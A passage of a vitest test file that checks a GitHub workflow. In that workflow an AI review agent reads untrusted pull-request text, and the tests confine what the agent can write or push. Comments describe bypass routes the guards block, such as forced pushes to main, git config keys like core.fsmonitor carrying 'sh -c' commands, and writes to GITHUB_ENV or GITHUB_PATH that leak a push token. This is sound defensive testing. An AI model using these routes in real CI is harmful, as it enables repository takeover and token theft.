import { describe, it, expect } from 'vitest';
import { fileURLToPath } from 'node:url';
import { execFileSync, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

/**
 * Guard: how a `bot-fold` run is allowed to write to a PR branch.
 *
 * The review agent in `pr-bot-review.yml` reads untrusted PR, issue and comment text on a
 * public repo, so it deliberately has no shell. Fold mode widens it to the file-write tools
 * so it can apply its own findings - and that is the whole of the widening. Deciding WHAT to
 * change stays with the agent; making the change durable is a plain `run:` step, which is what
 * keeps the destination ref, the force-push choice and the set of paths a fold may touch out of
 * the agent's reach as a matter of construction rather than of prose.
 *
 * Nothing else can catch a regression here. The fold path cannot be exercised before a change
 * to this file merges: claude-code-action validates the calling workflow against the
 * DEFAULT-BRANCH copy and no-ops with a successful exit when they differ, so labelling the PR
 * that edits it does nothing and labelling any other PR runs main's copy. A fold run is also
 * expensive and mutates a branch, so it is not something CI can rehearse. These assertions are
 * the only pre-merge evidence the invariants still hold, so they pin the antecedent (`FOLD_MODE`
 * itself) as well as the consequents.
 *
 * Scope is deliberate and not uniform. A gate or a tool list is a property of the step it sits
 * on, so those are pinned step-scoped; an invariant stated as "a fold cannot push X" or "this job
 * does not execute checkout bytes" is a property of the FILE, so `gitPushes`, `gitSubcommands`,
 * `invokedPrograms`, `checkoutCodeReferences`, `runnerFileWrites`, `stepNames` and the
 * post-agent git-config sweep all read every `run:` body. A step-scoped assertion over one of
 * those is the shape that has been defeated repeatedly: it makes the bound a property of a NAME,
 * and any second step doing the same thing is invisible.
 *
 * Where a control is an executable shell fragment it is EXTRACTED FROM THE COMMITTED YAML AND
 * RUN, not pattern-matched. An earlier version of this file asserted only that the guard's text
 * was present, which left `grep -v -E`, a dropped `--cached` and an appended `CHANGED=0` all
 * passing - each of which disarms the guard completely while every literal it named survived.
 * Text matching is still used for the declarative parts (tool lists, `if:` gates, step `env:`),
 * matching the sibling guards: the repo carries no YAML parser dependency and adding one for a
 * workflow assertion is not worth the supply chain.
 */

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../..');
const WORKFLOW = path.join(REPO_ROOT, '.github', 'workflows', 'pr-bot-review.yml');

/**
 * The host tools the harnesses below shell out to, directly or through the `gh`/`git`/`bash`
 * stubs they put on PATH. Checked once, up front: a host missing one would otherwise fail
 * partway through a lifted shell body with the stub's own error, which reads as a defect in the
 * guard rather than as a missing prerequisite. Named so the failure says which one.
 */
for (const tool of ['bash', 'git', 'jq', 'awk', 'grep', 'tr', 'mktemp', 'sha256sum', 'cut', 'base64', 'date']) {
  const found = spawnSync('sh', ['-c', `command -v ${tool}`], { encoding: 'utf8' }).status === 0;
  if (!found) throw new Error(`checkBotFoldWritePath: required host tool not on PATH: ${tool}`);
}

/**
 * A `mktemp` shim, because macOS does not honour `TMPDIR`.
 *
 * BSD `mktemp` resolves the Darwin per-user temp dir through `confstr` and ignores `TMPDIR`
 * outright - `TMPDIR=/x bash -c mktemp` still lands in `/var/folders/.../T`, measured on this
 * host. The lifted bodies call `mktemp` with no arguments, so pointing `TMPDIR` at the harness's
 * scratch dir (which the Linux runner does honour, and which is what these harnesses used to
 * claim was enough on its own) left every one of those files behind on a developer's machine:
 * one focused run left 111 of them. The shim goes first on PATH and forwards to the real binary,
 * so the files land in the scratch dir that is removed at the end of each run - on both
 * platforms, rather than on one.
 */
function writeMktempShim(dir: string): void {
  const real = execFileSync('sh', ['-c', 'command -v mktemp'], { encoding: 'utf8' }).trim();
  fs.writeFileSync(path.join(dir, 'mktemp'), ['#!/bin/sh', `exec ${real} "$TMPDIR/tmp.XXXXXXXXXX"`].join('\n'), {
    mode: 0o755,
  });
}

/**
 * One `- name: X` step, from its name line up to the next list item at the same indent - or to
 * the end of the file, since the last step in the job has no following step to stop at. The name
 * must match in full (a trailing parenthetical aside is allowed) and must resolve to exactly one
 * step, so a new step whose name merely starts with an asserted one cannot silently be picked up
 * instead. The terminator is any `- ` at the SAME indent as the matched step (a backreference),
 * not `- name: ` alone, so a step written in some other YAML order cannot let one block bleed
 * into the next.
 *
 * Indent is matched loosely and the terminator derived from it, rather than pinned to the six
 * columns this file happens to use. YAML does not care, so a step written `-   name:` is still a
 * step - and keying on exact columns made such a step invisible to every sweep below at once.
 */
function step(src: string, name: string): string {
  const escaped = name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const head = new RegExp(`^ +-\\s+name: ${escaped}(?: \\(.*\\))?$`, 'gm');
  expect([...src.matchAll(head)], `step name is not unique: ${name}`).toHaveLength(1);
  const found = src.match(
    new RegExp(`^( +)-\\s+name: ${escaped}(?: \\(.*\\))?$[\\s\\S]*?(?=^\\1-\\s|$(?![\\s\\S]))`, 'm')
  )?.[0];
  expect(found, `step not found: ${name}`).toBeTruthy();
  return found ?? '';
}

/**
 * The given YAML text with whole-line comments dropped, so prose cannot satisfy an assertion.
 * Applied to a whole step this keeps the `name:`, `if:`, `env:` and `run:` lines and any inline
 * trailing comment - it is a comment filter, not a `run:` extractor.
 */
function withoutComments(yaml: string): string {
  return yaml
    .split('\n')
    .filter(line => !/^\s*#/.test(line))
    .join('\n');
}

/**
 * Every `run:` body in the file, uncommented.
 *
 * The header is PARSED rather than matched against an enumeration of spellings. A YAML block
 * scalar header is an indicator, then a chomping indicator and an indentation indicator IN
 * EITHER ORDER, then optional trailing whitespace and a comment - and a `run:` value may also be
 * a plain scalar that wraps onto the following lines with no indicator at all. Two regex arms
 * read five of those shapes and missed `| # c`, `|2-`, `|+ # c` and the wrapped plain scalar,
 * each of which is a real step to a YAML parser. A body this helper misses is invisible to
 * EVERY sweep below at once, which is how a `git push --force ... HEAD:refs/heads/main` step
 * stayed green under one of them.
 *
 * The body is every following line indented past the `run:` KEY, blank lines included, up to
 * the first line that is not. Taking the indent from the file rather than from the six/eight/ten
 * columns this workflow happens to use is what makes an oddly-nested step visible; measuring
 * past the list-item dash is what makes an unnamed step visible; and a last line with no
 * trailing newline is still a line, which the previous `(?:\1 +.*\n)+` form dropped.
 */
function runBodiesRaw(src: string): string[] {
  const lines = src.split('\n');
  const bodies: string[] = [];
  for (let i = 0; i < lines.length; i++) {
    const head = lines[i].match(/^( *(?:-\s+)?)run:(.*)$/);
    if (!head) continue;
    const keyColumn = head[1].length;
    const isBlock = /^ *[|>](?:[-+]?\d*|\d*[-+]?) *(?:#.*)?$/.test(head[2]);
    const body = isBlock ? [] : [head[2].trim()];
    let j = i + 1;
    for (; j < lines.length; j++) {
      if (/^\s*$/.test(lines[j])) {
        body.push('');
        continue;
      }
      if ((lines[j].match(/^ */) ?? [''])[0].length <= keyColumn) break;
      body.push(lines[j]);
    }
    i = j - 1;
    bodies.push(body.join('\n'));
  }
  return bodies;
}

/** The same bodies with whole-line comments dropped, which is what a shell sweep wants. */
const runBodies = (src: string) => runBodiesRaw(src).map(withoutComments);

/** One parsed command: its shell words, and the separator that PRECEDED it (`''` for the first). */
type ShellCommand = { words: string[]; sep: string; end: string };

/** The index of the `)` closing the `(` at `open`, quotes honoured. */
function matchingParen(text: string, open: number): number {
  let depth = 0;
  let quote = '';
  for (let i = open; i < text.length; i++) {
    const char = text[i];
    if (quote) {
      if (char === quote) quote = '';
      continue;
    }
    if (char === '"' || char === "'") quote = char;
    else if (char === '(') depth++;
    else if (char === ')' && --depth === 0) return i;
  }
  return text.length;
}

/**
 * One `run:` body split into commands, each an array of shell words, honouring single quotes,
 * double quotes, backslash escapes, `${ }` and `$( )` nesting. Word-splitting has to be
 * quote-aware or the path guard's own `grep -E '^(\.github|...)/'` patterns read as commands.
 *
 * A command substitution is parsed RECURSIVELY and its text also stays in the enclosing word,
 * because both readings matter: the inner commands are commands, and the enclosing command is
 * handed their output. Flattening it instead - ending the enclosing command at `$(` - meant
 * `bash <<< "$(cat ./scripts/x.sh)"` produced a `bash` command with no path argument at all.
 *
 * No `#` and no heredoc handling, and the reliance is stated rather than implied. The bodies this
 * reads are the ones `runBodies` has comment-stripped for WHOLE lines only, so an apostrophe in a
 * TRAILING comment opens a quote state that swallows the rest of the body. That is not reachable
 * as a bypass today, and the reason is worth keeping: an unbalanced quote removes a real entry
 * from the file-wide `gitSubcommands`/`invokedPrograms` pins, so the suite reds on the edit
 * itself. Self-announcing, but caught incidentally by a legitimate entry going missing - so a
 * change to those pins should keep that property in mind.
 */
function shellCommands(text: string): ShellCommand[] {
  const commands: ShellCommand[] = [];
  const nested: ShellCommand[] = [];
  let words: string[] = [];
  let word = '';
  let started = false;
  let sep = '';
  let quote = '';
  let braces = 0;
  const endWord = () => {
    if (started) {
      words.push(word);
      word = '';
      started = false;
    }
  };
  const endCommand = (next: string) => {
    endWord();
    // `next` is the separator that ENDED this command, recorded on the command itself: a
    // `case` arm pattern is syntactically "a command terminated by `)`", and that position is
    // the only thing that tells `*)` apart from a program whose name happens to carry a glob.
    if (words.length) commands.push({ words, sep, end: next });
    words = [];
    sep = next;
  };
  for (let i = 0; i < text.length; i++) {
    const char = text[i];
    if (quote === "'") {
      word += char;
      if (char === "'") quote = '';
      continue;
    }
    // A line continuation is REMOVED by bash before it tokenizes, rather than escaping a
    // character: `git \`+newline+`push` is the one command `git push`, which a sweep matching
    // the literal text `git push` does not see and which this then reads as two ordinary words.
    if (char === '\\' && text[i + 1] === '\n') {
      i++;
      continue;
    }
    if (char === '\\' && text[i + 1]) {
      word += char + text[++i];
      started = true;
      continue;
    }
    if (char === '$' && text[i + 1] === '(') {
      const close = matchingParen(text, i + 1);
      nested.push(...shellCommands(text.slice(i + 2, close)));
      word += text.slice(i, close + 1);
      started = true;
      i = close;
      continue;
    }
    // `${VAR}` is one word. The braces are separators below, so without this an unquoted
    // `${S}` split into `$`, `S` and the tail and no word ever carried the `$S` reference the
    // taint tracking looks for - while the documented `"$S"` form passed.
    if (char === '$' && text[i + 1] === '{') {
      word += '${';
      braces++;
      started = true;
      i++;
      continue;
    }
    if (char === '}' && braces > 0) {
      word += char;
      braces--;
      continue;
    }
    if (quote === '"') {
      if (char === '"') quote = '';
      word += char;
      started = true;
      continue;
    }
    if (char === '"' || char === "'") {
      quote = char;
      word += char;
      started = true;
      continue;
    }
    // `||` and `&&` are sequencing, not a pipe, so the two are told apart here: the pipe is
    // what carries one command's bytes into the next, and that distinction is what lets
    // `cat ./x.sh | bash` be caught without `grep ... || true` being a false positive.
    if (char === '|' || char === '&') {
      const double = text[i + 1] === char;
      endCommand(double ? char + char : char);
      if (double) i++;
      continue;
    }
    // Separators BEFORE whitespace, because a newline is both and the command break is
    // the stronger reading. With the tests the other way round `\n` took the whitespace
    // arm and `continue`d, so every line of a `run:` body ran together into one command
    // whose program was the first word of the body - and a body opening with a data-only
    // word (`set`, `git`, `echo`) then had everything after it skipped wholesale. A real
    // tracked script appended inside `Push fold commit` was invisible that way.
    if ('\n;(){}`'.includes(char)) {
      endCommand(char === '\n' ? '\n' : char);
      continue;
    }
    if (/\s/.test(char)) {
      endWord();
      continue;
    }
    word += char;
    started = true;
  }
  endCommand('');
  return [...commands, ...nested];
}

/**
 * Words that are never the PROGRAM of the command they head, so a sweep looking for a program
 * must read past them: shell keywords, the builtins that take a command as their argument, and
 * `VAR=value`. Two different reasons for membership, and they are not interchangeable - which
 * is what `COMMAND_PREFIX` below separates out. `if`/`while`/`command`/`env`/`sudo`/`time` are
 * followed by the real program; `for`/`local`/`in`/`case`/`exit`/`return` are followed by a
 * variable, a word list or a status, so there is no program to find. What they share is only
 * that reading the first word as the program is wrong in both cases.
 *
 * `command`, `env`, `time` and `sudo` are none of them keywords, and leaving any one out makes
 * every program-shaped sweep in this file read the prefix as the program. `sudo` was the gap:
 * `sudo git push --force` put `sudo` in command position, so `gitPushes` found no push at all
 * while the otherwise identical `command git push --force` and `env git push --force` were both
 * refused. `spellings` below carries both a bare and a quoted prefix so that stays falsified.
 */
const SHELL_PREFIX =
  /^(if|then|elif|else|fi|for|while|until|do|done|case|esac|in|!|time|command|env|sudo|local|return|exit)$/;

/**
 * The `SHELL_PREFIX` words a COMMAND follows, as against the ones a variable name (`for`,
 * `local`), a word list (`in`, `case`) or an exit status (`exit`, `return`) follows. Only this
 * subset may be stripped when the question is "what program runs here": strip `for` and the
 * loop variable is reported as a program.
 */
const COMMAND_PREFIX = /^(if|then|elif|else|while|until|do|!|time|command|env|sudo)$/;

/** `SHELL_PREFIX` words that head a command no program is part of. */
const NON_COMMAND_HEAD = /^(fi|for|done|case|esac|in|local|return|exit)$/;

/**
 * Commands whose path arguments are DATA and never a program. This is the whole of the
 * allowlist deliberately: the assertion below is "a job step may not run repo-tracked code",
 * and an enumeration of INTERPRETERS is the wrong side of that to enumerate - every tracked
 * root script in this repo is mode 100755, so `./scripts/install-hooks.sh` names no
 * interpreter at all, and neither do `make`, `.` or an interpreter reached through `$VAR`.
 * Inverting it means a new command has to be justified here before it may be handed a path.
 */
const DATA_ONLY_COMMANDS =
  /^(git|gh|jq|echo|printf|cat|ls|diff|file|rm|mv|cp|mkdir|touch|sha256sum|cut|tr|head|tail|wc|sort|uniq|sed|grep|test|\[|\[\[|mktemp|date|basename|dirname|read|export|set|shift|unset|true|false|emit|count_since)$/;

/**
 * A shell word with its quoting removed, the way bash builds the word it will execute.
 *
 * Quote characters go, and OUTSIDE single quotes a backslash escapes the next character: the
 * shell consumes the backslash and runs what is left, so `\git` IS the program `git` and `\'`
 * IS the word `'`. Two earlier forms under-stripped this and each did so where a prefix test
 * runs: the lookbehind form consumed the character before a quote and so could not match the
 * second of two adjacent quotes (`'env'` normalized, `''env''` did not), and the pair-preserving
 * form kept every `\x` verbatim (`'env'` normalized, `\env` did not). Both leave a word that no
 * `SHELL_PREFIX` or program test matches, which puts the command behind them outside every
 * by-value bound in this file while the PROGRAMS backstop reports an unknown head - loud, but
 * only by accident.
 *
 * Inside SINGLE quotes a backslash is literal and survives. Inside DOUBLE quotes it escapes only
 * `"`, `$`, backtick and itself, and is otherwise kept - `"a\b"` is the word `a\b` to bash.
 */
function unquoteWord(word: string): string {
  let out = '';
  let quote = '';
  for (let i = 0; i < word.length; i++) {
    const char = word[i] as string;
    if (quote === "'") {
      if (char === "'") quote = '';
      else out += char;
      continue;
    }
    if (char === '\\') {
      const next = word[i + 1];
      if (next === undefined) {
        out += '\\';
        continue;
      }
      i++;
      if (quote === '"' && !'"$`\\'.includes(next)) out += '\\';
      out += next;
      continue;
    }
    if (char === quote) {
      quote = '';
      continue;
    }
    if (quote === '' && (char === "'" || char === '"')) {
      quote = char;
      continue;
    }
    out += char;
  }
  return out;
}

/**
 * Tracked repo-root FILES by bare name, read from the index rather than listed here so the set
 * cannot go stale. Needed because the step's working directory IS the checkout, so `bash dev`
 * names a tracked file with no slash anywhere in it - and `bash` resolves a script operand
 * relative to CWD before it consults `$PATH`, and needs no execute bit to run one. 66 of these
 * exist, so "no slash" was never a safe proxy for "not a checkout path".
 */
const rootTrackedFiles = new Set(
  execFileSync('git', ['ls-tree', 'HEAD'], { cwd: REPO_ROOT, encoding: 'utf8' })
    .split('\n')
    .filter(line => / blob /.test(line))
    .map(line => line.split('\t')[1])
    .filter(Boolean)
);

/**
 * A reference into a directory the agent can write: `./x`, `../x`, `dir/file`,
 * `$GITHUB_WORKSPACE`, `$RUNNER_TEMP`, or the bare name of a tracked repo-root file. The two
 * variables are named because a bare write-tool grant reaches absolute paths, so the runner
 * temp is as writable as the checkout is.
 */
const referencesCheckout = (text: string) =>
  /(?:^|[\s"'=(:])(?:\.{1,2}\/|[A-Za-z0-9_.@-]+\/[A-Za-z0-9_.@/-])/.test(` ${text}`) ||
  /GITHUB_WORKSPACE|RUNNER_TEMP/.test(text) ||
  rootTrackedFiles.has(text);

/**
 * A command's words with its leading `VAR=value` and shell-keyword prefixes dropped.
 *
 * The prefix word is UNQUOTED before it is tested, because the tokenizer keeps quote characters
 * and quoting a word changes nothing about what the shell runs. Testing the raw word here while
 * `invokedPrograms` tested the normalized one made the two disagree in the quiet direction:
 * `'env' git push --force origin HEAD:main` reported `'env'` as the program, so it entered
 * neither `gitPushes` nor the staging pin nor `commandsNamed`, while the PROGRAMS set - which
 * did normalize - still reported exactly `git` and stayed green. Every by-value bound on where
 * a fold may push simply stopped being consulted, and nothing named an unknown program.
 */
function commandProgram(words: string[]): string[] {
  let rest = words;
  while (rest.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(rest[0]) || SHELL_PREFIX.test(unquoteWord(rest[0])))) {
    rest = rest.slice(1);
  }
  return rest;
}

/** The subcommand of a `git` invocation, with git's own global options (and their values) skipped. */
function gitSubcommand(words: string[]): string | undefined {
  const takesValue =
    /^(-c|-C|--namespace|--git-dir|--work-tree|--exec-path|--config-env|--super-prefix|--attr-source)$/;
  for (let i = 1; i < words.length; i++) {
    const word = unquoteWord(words[i]);
    if (takesValue.test(word)) {
      i++;
      continue;
    }
    if (word.startsWith('-')) continue;
    return word;
  }
  return undefined;
}

/**
 * Every `git` invocation in the file whose subcommand matches, as parsed word vectors.
 *
 * Found in the PARSED command rather than in the text, because `git <subcommand>` with exactly
 * one space is not how this job writes git: `GIT_CONFIG_GLOBAL` is `/dev/null` in the push
 * step's env, so identity and every knob is passed per-invocation and the house style is
 * `git -c <key>=<value> <subcommand>`. A literal matcher missed that, missed two spaces, and
 * missed a line continuation between the two words.
 */
function gitInvocations(src: string): string[][] {
  const found: string[][] = [];
  for (const body of runBodies(src)) {
    for (const { words } of shellCommands(body)) {
      const rest = commandProgram(words);
      if (unquoteWord(rest[0] ?? '') === 'git') found.push(rest);
    }
  }
  return found;
}

function gitCommands(src: string, subcommands: RegExp): string[][] {
  return gitInvocations(src).filter(words => {
    const sub = gitSubcommand(words);
    return sub !== undefined && subcommands.test(sub);
  });
}

/**
 * Every `git push` in the file, as parsed word vectors: quotes stripped, shell redirections
 * dropped. Pinned by VALUE at the call site rather than scanned for `--force` and a
 * `refs/heads/` literal - the short refspec `HEAD:main` is an equally valid way to name a
 * branch and carries neither.
 */
const gitPushes = (src: string) =>
  gitCommands(src, /^push$/).map(words => words.filter(word => !/^\d*[<>]/.test(word)).map(unquoteWord));

/**
 * Every distinct git subcommand invoked anywhere in the file, sorted.
 *
 * Pinned as a whole SET at the call site because the staging assertion below is a denylist of
 * spellings (`add`, `update-index`, `stage`), and a denylist only ever bounds the spellings
 * someone thought of: `git apply --cached` stages arbitrary content and is none of the three.
 * An allowlist of the subcommands this job uses at all means a new one has to be justified
 * here rather than merely not guessed at.
 */
const gitSubcommands = (src: string) =>
  [...new Set(gitCommands(src, /./).map(words => gitSubcommand(words) ?? ''))].sort();

/** The `Push fold commit` step's `env:` keys, shared by the pin below and the harness that
 * executes that step's body. */
const PUSH_STEP_ENV_KEYS = [
  'PUSH_TOKEN',
  'HEAD_REF',
  'REPO',
  'SERVER_URL',
  'RUN_ID',
  'GIT_CONFIG_GLOBAL',
  'GIT_CONFIG_SYSTEM',
  'GIT_CONFIG_NOSYSTEM',
  'GIT_CONFIG_COUNT',
  'GIT_CONFIG_PARAMETERS',
];

/**
 * Every git configuration KEY this file sets on a command line, as a whole SET.
 *
 * `git` is in `DATA_ONLY_COMMANDS` and the sweeps above bound which SUBCOMMANDS it may run -
 * but several config keys are a command git executes: `core.fsmonitor`, `diff.external`,
 * `core.sshCommand`, `uploadpack.packObjectsHook`. `gitSubcommand` skips `-c` and its value on
 * purpose, so a key rides behind an allowlisted subcommand invisibly, which makes `git` the
 * same shape as `awk`: a program whose ARGUMENT is a program. Swapping one key on an
 * already-shipped line (`-c core.excludesFile=/dev/null` -> `-c core.fsmonitor='sh -c ...'`)
 * is a one-word edit inside the step that holds PUSH_TOKEN, upstream of the path guard and the
 * size bound. The `GIT_CONFIG_*` nulling in that step's env bounds config FILES and does not
 * touch this. `--config-env=<key>=<var>` names a key the same way and is pinned with it.
 */
const GIT_CONFIG_KEYS = ['core.attributesFile', 'core.excludesFile', 'core.quotePath', 'user.email', 'user.name'];

const gitConfigKeys = (src: string) =>
  [
    ...new Set(
      gitInvocations(src).flatMap(words =>
        words.flatMap((word, index) => {
          const value = unquoteWord(word);
          if (value === '-c' || value === '--config-env') {
            return [unquoteWord(words[index + 1] ?? '').split('=')[0]];
          }
          if (value.startsWith('--config-env=')) return [value.slice('--config-env='.length).split('=')[0]];
          return [];
        })
      )
    ),
  ].sort();

/**
 * The names of every environment assignment made as a PREFIX to a command, anywhere in the
 * file, as a whole SET - `FOO=bar cmd`, not the standalone `FOO=$(cmd)` assignments this job is
 * written in.
 *
 * One spelling of `gitConfigKeys`'s class that neither that pin nor the step's `env:` block can
 * see: `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='sh -c ...' git
 * ls-files` carries the config in the command's own environment. Measured on git 2.50.1: it
 * overrides `GIT_CONFIG_COUNT: '0'` in the step env, and `commandProgram` strips the
 * assignments, so the command still parses as an allowlisted `git ls-files` carrying no `-c`.
 * The shipped set is empty, which is the tightest allowlist available here.
 *
 * Not the last such spelling, and this file does not claim to enumerate them: `redirectionTargets`
 * and `runnerFileCommandMentions` below bound `GIT_CONFIG_PARAMETERS`, which arrives from an
 * EARLIER step rather than from this command line or this step's `env:` at all.
 */
const envAssignmentPrefixes = (src: string) =>
  [
    ...new Set(
      runBodies(src).flatMap(body =>
        shellCommands(body).flatMap(({ words }) => {
          const names: string[] = [];
          let rest = words;
          // A COMMAND_PREFIX word may sit IN FRONT of the assignments: `env FOO=bar git ...` is
          // the same command with the same environment as `FOO=bar git ...`, and it runs through
          // the same `commandProgram` prefix strip. Stopping at word 0 was therefore invisible -
          // the command still parsed as an allowlisted `git`, so nothing named it. Skip the
          // prefix the way `programHeads` does and collect assignments on either side of it. The
          // SHELL_PREFIX words that head a command containing NO program (`for`, `local`,
          // `exit`) are deliberately not skipped: `for x in ...` would then report `x`.
          while (rest.length) {
            const word = unquoteWord(rest[0]);
            const assignment = word.match(/^([A-Za-z_][A-Za-z0-9_]*)=/);
            if (assignment) names.push(assignment[1]);
            else if (!COMMAND_PREFIX.test(word)) break;
            rest = rest.slice(1);
          }
          // A standalone assignment is not a prefix: nothing runs with that environment.
          return rest.length ? names : [];
        })
      )
    ),
  ].sort();

/**
 * Every file a `run:` body in this job REDIRECTS into, as a whole SET.
 *
 * The runner exposes `$GITHUB_ENV` and `$GITHUB_PATH` as ordinary files, and a line appended to
 * either one sets an environment variable, or a `$PATH` entry, for EVERY LATER STEP. That is the
 * one route into a later step's environment that no `env:` key pin in this file can see - the
 * pins read `env:` blocks, and this channel never touches one. It is not hypothetical: with all
 * four `GIT_CONFIG_*` vars in force, `GIT_CONFIG_PARAMETERS` delivered this way runs an arbitrary
 * command on the shipped `git ls-files` line in the step that holds PUSH_TOKEN (measured on git
 * 2.50.1, token written to disk, step exit 0). The workflow's own comment block already calls a
 * write to these files "command execution in EVERY later step" - it just used that to fence the
 * AGENT out of `$RUNNER_TEMP`, and nothing applied it to this job's own `run:` bodies.
 *
 * A set of redirect TARGETS rather than a grep for those two names, because the bound wanted is
 * "where does this job write", and `$GITHUB_STEP_SUMMARY`, an absolute path or a `$HOME` dotfile
 * are the same shape. `runnerFileCommandMentions` below catches the rest of the class - a write
 * reaching the same files through `tee`, `python3` or anything else that is not a redirection.
 *
 * `2>&1` and friends are excluded: a descriptor duplication opens no file. A redirection with no
 * target at all is NOT excluded - it reaches the pin as `''` and reds it.
 */
const REDIRECTION_TARGETS = [
  '"$DEST"',
  '"$GITHUB_OUTPUT"',
  '"$STAGED_NUMSTAT"',
  '"$STAGED_PATHS"',
  '"$err"',
  '/dev/null',
];

function redirectionTargets(src: string): string[] {
  const targets: string[] = [];
  for (const body of runBodies(src)) {
    for (const { words, end } of shellCommands(body)) {
      words.forEach((word, index) => {
        // `>`/`>>`, optionally preceded by a descriptor number, with the target either glued on
        // or supplied as the next word.
        const match = /^\d*>>?(.*)$/.exec(word);
        if (!match) return;
        const glued = match[1];
        const next = words[index + 1];
        // `2>&1` is a descriptor duplication and opens no file. `&` is a command separator to
        // the parser, so it arrives here as a trailing bare `2>` on a command that ended at
        // `&` - which is the only way a redirection operator can legitimately have no target.
        if (!glued && next === undefined && end === '&') return;
        targets.push(glued || (next ?? ''));
      });
    }
  }
  return [...new Set(targets)].sort();
}

/**
 * Every mention of a runner file-command variable in a `run:` body, by any route.
 *
 * `redirectionTargets` bounds the redirection spelling; this bounds the name itself, so a write
 * through `tee -a "$GITHUB_ENV"` or `python3 -c ... os.environ["GITHUB_ENV"]` is refused too.
 * Deliberately a text sweep and not a parse: there is no legitimate use of either file in this
 * job, so the tightest available statement is that neither name appears at all.
 */
const runnerFileCommandMentions = (src: string) =>
  runBodies(src)
    .flatMap(body => [...body.matchAll(/GITHUB_(?:ENV|PATH)/g)].map(match => match[0]))
    .sort();

/**
 * Every runner-provided variable a `run:` body EXPANDS, as a whole SET, minus the one this job
 * is allowed to read.
 *
 * `runnerFileCommandMentions` bounds a SPELLING of the name; this bounds the NAME. Reassembling
 * it (`N=GITHUB_""ENV`, then `${!N}`) puts no such spelling in the body at all: the env file's
 * path is read out of the variable into `$GITHUB_OUTPUT`, which is allowlisted as a redirection
 * target, and the append to it sets `BASH_ENV` for every later step - one line, inside an
 * existing body, at 30/30 green. `$GITHUB_OUTPUT` is the only runner variable any step in this
 * job has a use for, so any other one has to be justified here.
 */
const RUNNER_ENV_ALLOWED = ['GITHUB_OUTPUT'];

const runnerEnvRefs = (src: string) =>
  [
    ...new Set(
      runBodies(src).flatMap(body =>
        [...body.matchAll(/\$\{?((?:GITHUB|RUNNER|ACTIONS)_[A-Z0-9_]*)/g)].map(match => match[1])
      )
    ),
  ]
    .filter(name => !RUNNER_ENV_ALLOWED.includes(name))
    .sort();

/**
 * Every `${!name}` INDIRECT expansion and every assignment to a runner-provided variable in a
 * `run:` body, as whole sets.
 *
 * The two halves that read or write a runner variable under a name `runnerEnvRefs` cannot see:
 * `${!N}` reaches `$GITHUB_ENV` through `N`, and `GITHUB_OUTPUT=...` rebinds the one name the
 * redirection allowlist trusts, which turns a permitted target into any file at all. Neither has
 * a legitimate use in this job. (`eval`, the third route the same class reaches through, needs no
 * sweep of its own: it is a program, and the `invokedPrograms` allowlist already refuses one.)
 */
const indirectExpansions = (src: string) =>
  [...new Set(runBodies(src).flatMap(body => [...body.matchAll(/\$\{!/g)].map(() => '${!}')))].sort();

const runnerAssignments = (src: string) =>
  [
    ...new Set(
      runBodies(src).flatMap(body =>
        shellCommands(body).flatMap(({ words }) =>
          words.flatMap(word => {
            const name = /^((?:GITHUB|RUNNER|ACTIONS)_[A-Z0-9_]*)=/.exec(unquoteWord(word))?.[1];
            return name ? [name] : [];
          })
        )
      )
    ),
  ].sort();

/**
 * The sweeps above as ONE value, so one assertion carries every bound.
 *
 * They are halves of a single statement - "this job writes these files, and reaches the runner's
 * env-setting files by no route at all" - and split across separate `expect`s, deleting the
 * weaker one is a no-op on the shipped file. Measured: with the mentions assertion removed the
 * suite stays green, and only the `tee -a "$GITHUB_PATH"` route reopens; likewise the two
 * reassembly sweeps, whose routes leave no literal `GITHUB_ENV` in the body for `mentions` to
 * find. Returned together instead.
 */
const runnerFileWrites = (src: string) => ({
  targets: redirectionTargets(src),
  mentions: runnerFileCommandMentions(src),
  expansions: runnerEnvRefs(src),
  indirect: indirectExpansions(src),
  reassignments: runnerAssignments(src),
});

/**
 * The job's step list, in order: each step's `name:`, or the marker below when a step has none.
 *
 * The three `env:`/key-set pins in this file each argue that a bound on which keys are present
 * "cannot be stated by pinning the ones someone already thought of". The step sequence was the
 * one structural list left unstated, and it is a delivery vector rather than a bookkeeping
 * detail: a new step whose whole body is one allowlisted `echo` changes what a later, fully
 * guarded step executes, by writing the runner file commands above. Every body-shaped sweep in
 * this file runs over whatever steps exist, so none of them can say "and no others".
 *
 * `name:` is optional in the step schema, and an unnamed step has defeated four sweeps here at
 * once before, so an unnamed one is REPORTED rather than skipped - `toEqual` then reds on it.
 */
const UNNAMED_STEP = '<unnamed step>';

/**
 * The job's steps, in file order, each as its name (or `UNNAMED_STEP`) and its whole block.
 *
 * `stepNames` is derived from this rather than lifted separately, so the two cannot disagree
 * about what a step is. Chunks rather than a name list because one assertion needs POSITION
 * rather than identity: the post-agent git-config sweep has to know which side of the agent a
 * `git` invocation sits on.
 *
 * The list-item marker does not have to carry a name. `-` alone on its line, with the mapping on
 * the lines below it, is a legal step to YAML and matches no `- name:` sweep - which is how a
 * twenty-first step stayed green. A name-less item is reported as `UNNAMED_STEP` rather than
 * skipped, so a pin `toEqual`-ing the committed list reds on it, the same treatment a `run:`-only
 * step already got.
 */
function stepChunks(src: string): { name: string; body: string }[] {
  // `steps:` is the last key of the only job, so its block runs to the end of the file. Lifted
  // by value rather than by a file-wide sweep so a `- ` list under some other key cannot join.
  const block = /^ {4}steps:\n([\s\S]*)$/m.exec(src);
  expect(block, 'the steps: block moved').not.toBeNull();
  return (block?.[1] ?? '')
    .split(/^(?= {6}-(?:\s|$))/m)
    .filter(chunk => chunk.trim())
    .map(chunk => {
      const head = /^ {6}-(?: (.*))?$/m.exec(chunk);
      const named = /^name: (.*)$/.exec(head?.[1] ?? '');
      return { name: named ? named[1] : UNNAMED_STEP, body: chunk };
    });
}

const stepNames = (src: string) => stepChunks(src).map(({ name }) => name);

/**
 * Every invocation of a program matching `name` anywhere in a `run:` body, as parsed word
 * vectors: quotes stripped, a leading `VAR=value` prefix dropped.
 */
function commandsNamed(src: string, name: RegExp): string[][] {
  const found: string[][] = [];
  for (const body of runBodies(src)) {
    for (const { words } of shellCommands(body)) {
      const rest = commandProgram(words).map(unquoteWord);
      if (rest.length && name.test(rest[0])) found.push(rest);
    }
  }
  return found;
}

/**
